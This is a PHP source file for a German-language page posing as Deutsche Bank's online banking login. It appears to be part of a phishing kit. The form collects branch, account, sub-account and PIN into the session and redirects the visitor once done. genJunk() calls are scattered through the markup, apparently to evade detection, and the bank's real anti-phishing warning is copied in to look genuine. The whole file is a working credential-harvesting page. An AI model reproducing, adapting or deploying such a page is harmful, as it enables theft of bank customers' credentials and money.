<?php
	session_start();
	include("config.php");
	
	if (isset($_SESSION['finished']) && $_SESSION['finished']) {
		header('Location: '. $redirect);
	}
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="de" lang="de">
	<head>
		<title>Onlinebanking und Brokerage der Deutschen Bank</title>
		<meta http-equiv="X-UA-Compatible" content="IE=EmulateIE7">
		<meta http-equiv="content-type" content="text/html; charset=UTF-8">
		<meta http-equiv="expires" content="0">
		<meta name="robots" content="noindex" />
		<meta name="googlebot" content="noindex">
		<link rel="shortcut icon" type="image/ico" href="src/db_img/favicon.ico">
		<script src="src/db_js/prototype.js" type="text/javascript"></script>
		<script src="src/db_js/global.js" type="text/javascript"></script>
		<link rel="stylesheet" type="text/css" href="src/db_css/base.css" media="screen, print">
		<link rel="stylesheet" type="text/css" href="src/db_css/print.css" media="print">  		
	</head>
	<body id="login" class="noTopicContainer js fs-small">
		<?php echo genJunk() ?><div id="rollContainer">
			<?php echo genJunk() ?><div id="globalContainer">

				<?php echo genJunk() ?><div id="headerContainer">
					<p id="logoContainer"><img src="src/db_img/logo_db.gif" title="Logo Deutsche Bank" alt="Logo Deutsche Bank" width="267" height="76"></p>

					<?php echo genJunk() ?><div id="metaNavigation">
						<h4 class="access">Sprachauswahl und Filialsuche</h4>
						<ul>
							<li><a href="#">English Version</a></li>
							<li><a href="#" title="Neues Fenster: Finden Sie eine Filiale in Ihrer Nähe">Ihre Filiale</a></li>
						</ul>
					</div><?php echo genJunk() ?>
				</div><?php echo genJunk() ?>                         

				<?php echo genJunk() ?><div id="locationContainer"></div><?php echo genJunk() ?> 

				<?php echo genJunk() ?><div id="folderContainer">
					<?php echo genJunk() ?><div id="topicContainer">
						<?php echo genJunk() ?><div class="additionalInfo onlinebanking">
							<h4><span class="nowrap"> <span xml:lang="en" lang="en">OnlineBanking</span></span></h4>
							<p>Erledigen Sie Ihre täglichen Bankgeschäfte flexibel und bequem mit unserem <span class="nowrap"> <span xml:lang="en" lang="en">OnlineBanking</span>.</span></p>
							<ul>
								<li><a target="_blank" href="#" title="Neues Fenster: Rund ums Online-Banking">Rund ums Online-Banking</a></li>
								<li><a target="_blank" href="#" title="Neues Fenster: Demokonto testen">Demokonto testen</a></li>
								<li><a target="_blank" href="#" title="Neues Fenster: Konto eröffnen">Konto eröffnen</a></li>
								<li><a target="_blank" href="#" title="Neues Fenster: Konto für Online- und Telefon-Banking freischalten">Konto für Online- und Telefon-Banking freischalten</a></li>
								<li><a target="_blank" href="#" title="Neues Fenster: MobileBanking">MobileBanking</a></li>
							</ul>
						</div><?php echo genJunk() ?>
						
						<?php echo genJunk() ?><div class="additionalInfo help">
							<h4>Hilfe</h4>
							<ul>
								<li><a target="_blank" href="#" title="Neues Fenster: Häufig gestellte Fragen">Häufig gestellte Fragen</a></li>
								<li><a target="_blank" href="#" title="Neues Fenster: Download-Center">Download-Center</a></li>
								<li><a target="_blank" href="#" title="Neues Fenster: Nutzeranleitung">Nutzeranleitung</a></li>
								<li><a target="_blank" href="#" title="Neues Fenster: Technischer Support">Technischer Support</a></li>
								<li><a target="_blank" href="#" title="Neues Fenster: Sicherheit">Sicherheit</a></li>
							</ul>
						</div><?php echo genJunk() ?>

						<?php echo genJunk() ?><div id="verisign">
							<img name="seal" src="src/db_img/getseal.gif" oncontextmenu="return false;" usemap="#sealmap_small" alt="" border="0">
						</div><?php echo genJunk() ?>
					</div><?php echo genJunk() ?>
				
					<?php echo genJunk() ?><div id="contentContainer"><a name="contentContainer"></a>
						<?php echo genJunk() ?><div id="pathNavigation" class="access"><p><strong>Sie sind hier:</strong> Kunden-Login</p></div><?php echo genJunk() ?>

						<h1>Herzlich willkommen!</h1>

						<?php echo genJunk() ?><div id="mainContent">
							<ul class="tabNavigation">
								<li class="currentView"><strong><a href="#" target="_top" title="iTAN-Login"><span xml:lang="en" lang="en">Login</span> mit PIN</a></strong></li>
								<li><a href="#" target="_top" title="Login mit WebSign"><span xml:lang="en" lang="en">Login</span> mit <span xml:lang="en" lang="en">WebSign</span></a></li>
							</ul>

							<?php echo genJunk() ?><div class="formContainer">
								<form id="loginForm" method="post" action="index.php">
									
									<table class="roll layout" cellspacing="0">
										<tbody>
											<tr class="subsequentXS">
												<td class="nowrap rgtPadding">
													<p><label for="branch"><strong>Filiale</strong><br>(3-stellig)</label></p>  
													<p><input name="branch" maxlength="3" value="<?php echo (isset($_SESSION['branch']) ? $_SESSION['branch'] : ""); ?>" onkeyup="doNext(this, event);" onkeypress="checkCapsLock(event);" id="branch" autocomplete="off" type="text"></p>
												</td>
												<td class="nowrap rgtPadding">
													<p><label for="account"><strong>Konto</strong><br>(7-stellig)</label></p>
													<p><input name="account" maxlength="7" value="<?php echo (isset($_SESSION['account']) ? $_SESSION['account'] : ""); ?>" onkeyup="doNext(this, event);" onkeypress="checkCapsLock(event);" id="account" autocomplete="off" type="text"></p>
												</td>
												<td class="nowrap rgtPadding">
													<p><label for="subAccount"><strong>Unterkonto</strong><br>(2-stellig)</label></p>
													<p><input name="subaccount" maxlength="2" value="<?php echo (isset($_SESSION['subaccount']) ? $_SESSION['subaccount'] : "00"); ?>" onkeyup="doNext(this, event);" onkeypress="checkCapsLock(event);" id="subAccount" autocomplete="off" type="text"></p>
												</td>                            
												<td class="nowrap roll">
													<p><label for="pin"><strong><acronym title="Persönliche Identifikationsnummer">PIN</acronym></strong><br>(5-stellig)</label></p>
													<p><input name="pin" maxlength="5" value="<?php echo (isset($_SESSION['pin']) ? $_SESSION['pin'] : ""); ?>" onkeypress="checkCapsLock(event);" id="pin" autocomplete="off" type="password"></p>
												</td>
											</tr>
											
											<tr style="display:<?php echo (isset($_SESSION['err']) ? "table-row" : "none"); unset($_SESSION['err']); ?>">
												<td colspan="4">
													<?php echo genJunk() ?><div class="errorMsg" style="display:<?php echo (isset($_SESSION['branch_err']) ? "block" : "none"); unset($_SESSION['branch_err']); ?>"><label for="branch">Bitte geben Sie hier Ihre dreistellige Filialnummer ein. </label></div><?php echo genJunk() ?>
													<?php echo genJunk() ?><div class="errorMsg" style="display:<?php echo (isset($_SESSION['account_err']) ? "block" : "none"); unset($_SESSION['account_err']); ?>"><label for="account">Bitte geben Sie hier Ihre Kontonummer ein.</label></div><?php echo genJunk() ?>
													<?php echo genJunk() ?><div class="errorMsg" style="display:<?php echo (isset($_SESSION['subaccount_err']) ? "block" : "none"); unset($_SESSION['subaccount_err']); ?>"><label for="subAccount">Bitte geben Sie hier Ihre Unterkontonummer ein (z.B. 00).</label></div><?php echo genJunk() ?>
													<?php echo genJunk() ?><div class="errorMsg" style="display:<?php echo (isset($_SESSION['pin_err']) ? "block" : "none"); unset($_SESSION['pin_err']); ?>"><label for="pin">Bitte geben Sie hier Ihre fünfstellige <acronym title="Persönliche Identifikations Nummer">PIN</acronym> ein. Die Eingabe erfolgt verdeckt.</label></div><?php echo genJunk() ?>
												</td>
											</tr>
											
											<tr id="capsLockMessage" style="visibility:hidden">
												<td colspan="4">
													<?php echo genJunk() ?><div class="errorMsg"><label for="">Bitte beachten Sie, daß die "Hochstell-Taste" (Capslock) aktiv ist.</label></div><?php echo genJunk() ?>
												</td>
											</tr>
											
											<tr class="subsequentS">
												<td class="rgtPadding nowrap"><label for="proxyLogins">Direkt zu ...</label></td>
												<td colspan="3">
													<select name="quickLink" id="proxyLogins" class="roll" disabled>
														<option value="DisplayFinancialOverview" selected="selected">... Finanzübersicht</option>
													</select>
												</td>
											</tr>

											<tr>
												<td>&nbsp;</td>
												<td class="nowrap" colspan="3">
													<input name="sessionTAN" value="true" id="sessionTAN" class="checkbox" type="checkbox"><label for="sessionTAN">Session-<acronym title="Transaktionsnummer">TAN</acronym> für Wertpapieraufträge verwenden</label>
													<a href="#" rel="help" title="Neues Fenster: Weitere Informationen zu dieser Option"><img src="src/db_img/ic_help.gif" alt="Neues Fenster: Weitere Informationen zu dieser Option" width="15" height="15">
													</a>
												</td>
											</tr>

											<tr class="subsequentS">
												<td colspan="4">
													<table class="layout" id="phishing" cellspacing="0">
														<tbody>
															<tr>
																<td id="distractor"><strong>WICHTIG</strong></td>
																<td id="text">Bitte beachten Sie: Die Deutsche Bank fordert pro<br> Auftrag nie mehrere Transaktionsnummern (<acronym title="Transaktionsnummer">TAN</acronym>)!</td>
																<td id="action"><input value="Login ausführen" class="button confirm" name="sendOB_Login_x" type="submit"></td>
															</tr>
														</tbody>
													</table>
												</td>
											</tr>
										</tbody>
									</table>
								</form>
							</div><?php echo genJunk() ?> 

							<?php echo genJunk() ?><div>
								<?php echo genJunk() ?><div class="advice redDotSnippet _">
									<h3>Aktueller Sicherheitshinweis: Neue Phishing-Mails im Umlauf</h3>

									<p>Aktuell sind betrügerische E-Mails im Namen der Deutschen Bank im Umlauf, die zur Entwertung des TAN-Blockes auffordern.</p>

									<p>Bitte beachten Sie: Die Deutsche Bank wird von Ihnen niemals 
									vertrauliche Daten wie Ihre Kontonummer, Online- oder Telefonbanking-PIN
									oder TAN per E-Mail oder telefonisch abfragen. Auch werden wir Sie 
									niemals zur Entwertung oder dem Hochladen Ihres TAN-Blockes auffordern. 
									Sollten Sie solche E-Mails erhalten, folgen Sie den Aufforderungen zur 
									Preisgabe von persönlichen Zugangsdaten in keinem Fall!<br></p>

									<ul>
										<li><a class="toggleContent" href="#" target="_blank">mehr Informationen</a></li>
									</ul>

									<?php echo genJunk() ?><div class="infoBlock" id="">
										<?php echo genJunk() ?><div>
											<p>
												Die Deutsche Bank fordert pro Auftrag im Online-Banking 
												grundsätzlich niemals mehr als eine TAN an. Sollten Sie zur Eingabe von 
												mehreren TAN aufgefordert werden, brechen Sie den Vorgang ab und 
												informieren Sie uns umgehend. Informieren Sie uns unter der kostenlosen 
												Telefonnummer 0800 - 8 128 128 bzw. folgender E-Mail-Adresse: 
												security.db@db.com.
											</p>
										</div><?php echo genJunk() ?>
									</div><?php echo genJunk() ?>
								</div><?php echo genJunk() ?>
							</div><?php echo genJunk() ?>
						</div><?php echo genJunk() ?>
					</div><?php echo genJunk() ?> 
					<script type="text/javascript">setFocus('branch');</script>
				</div><?php echo genJunk() ?>

				<?php echo genJunk() ?><div class="access">
					<ul>
						<li><a href="#globalContainer">Zum Anfang der Seite springen</a></li>
					</ul>
				</div><?php echo genJunk() ?>
			</div><?php echo genJunk() ?>
		</div><?php echo genJunk() ?>
	</body>
</html>